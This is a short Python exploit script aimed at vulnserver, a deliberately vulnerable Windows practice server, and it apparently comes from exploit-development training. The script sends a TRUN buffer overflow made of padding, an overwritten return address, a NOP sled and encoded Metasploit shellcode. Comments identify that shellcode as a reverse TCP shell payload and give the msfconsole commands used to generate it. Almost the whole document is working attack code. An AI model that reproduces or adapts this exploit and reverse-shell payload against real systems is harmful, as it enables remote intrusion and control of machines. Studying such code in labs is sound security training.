# python code to exploit vulnserver in windows machine 
import socket
server = '192.168.47.141'
sport =  9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print (s.recv(1024))
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 32
payload = ("\xdd\xc5\xd9\x74\x24\xf4\xbf\x0b\x69\x6b\x36\x58\x31\xc9" +
"\xb1\x52\x31\x78\x17\x83\xc0\x04\x03\x73\x7a\x89\xc3\x7f" +
"\x94\xcf\x2c\x7f\x65\xb0\xa5\x9a\x54\xf0\xd2\xef\xc7\xc0" +
"\x91\xbd\xeb\xab\xf4\x55\x7f\xd9\xd0\x5a\xc8\x54\x07\x55" +
"\xc9\xc5\x7b\xf4\x49\x14\xa8\xd6\x70\xd7\xbd\x17\xb4\x0a" +
"\x4f\x45\x6d\x40\xe2\x79\x1a\x1c\x3f\xf2\x50\xb0\x47\xe7" +
"\x21\xb3\x66\xb6\x3a\xea\xa8\x39\xee\x86\xe0\x21\xf3\xa3" +
"\xbb\xda\xc7\x58\x3a\x0a\x16\xa0\x91\x73\x96\x53\xeb\xb4" +
"\x11\x8c\x9e\xcc\x61\x31\x99\x0b\x1b\xed\x2c\x8f\xbb\x66" +
"\x96\x6b\x3d\xaa\x41\xf8\x31\x07\x05\xa6\x55\x96\xca\xdd" +
"\x62\x13\xed\x31\xe3\x67\xca\x95\xaf\x3c\x73\x8c\x15\x92" +
"\x8c\xce\xf5\x4b\x29\x85\x18\x9f\x40\xc4\x74\x6c\x69\xf6" +
"\x84\xfa\xfa\x85\xb6\xa5\x50\x01\xfb\x2e\x7f\xd6\xfc\x04" +
"\xc7\x48\x03\xa7\x38\x41\xc0\xf3\x68\xf9\xe1\x7b\xe3\xf9" +
"\x0e\xae\xa4\xa9\xa0\x01\x05\x19\x01\xf2\xed\x73\x8e\x2d" +
"\x0d\x7c\x44\x46\xa4\x87\x0f\xa9\x91\xa8\x5a\x41\xe0\xb6" +
"\x75\xce\x6d\x50\x1f\xfe\x3b\xcb\x88\x67\x66\x87\x29\x67" +
"\xbc\xe2\x6a\xe3\x33\x13\x24\x04\x39\x07\xd1\xe4\x74\x75" +
"\x74\xfa\xa2\x11\x1a\x69\x29\xe1\x55\x92\xe6\xb6\x32\x64" +
"\xff\x52\xaf\xdf\xa9\x40\x32\xb9\x92\xc0\xe9\x7a\x1c\xc9" +
"\x7c\xc6\x3a\xd9\xb8\xc7\x06\x8d\x14\x9e\xd0\x7b\xd3\x48" +
"\x93\xd5\x8d\x27\x7d\xb1\x48\x04\xbe\xc7\x54\x41\x48\x27" +
"\xe4\x3c\x0d\x58\xc9\xa8\x99\x21\x37\x49\x65\xf8\xf3\x79" +
"\x2c\xa0\x52\x12\xe9\x31\xe7\x7f\x0a\xec\x24\x86\x89\x04" +
"\xd5\x7d\x91\x6d\xd0\x3a\x15\x9e\xa8\x53\xf0\xa0\x1f\x53" +
"\xd1")
# msfconsole
# use windows/shell_reverse_tcp
# set LHOST 192.168.47.141
# set LPORT 4444
# generate -b '\x00' -e x86/shikata_ga_nai
attack = ("A" * 2006 + eip + nopsled + payload + "C" * (3000-2006-4-32-len(payload)))

s.send(("TRUN ." + attack + '\r\n'))
print (s.recv(1024))
s.send("EXIT\r\n")
print (s.recv(1024))
s.close()
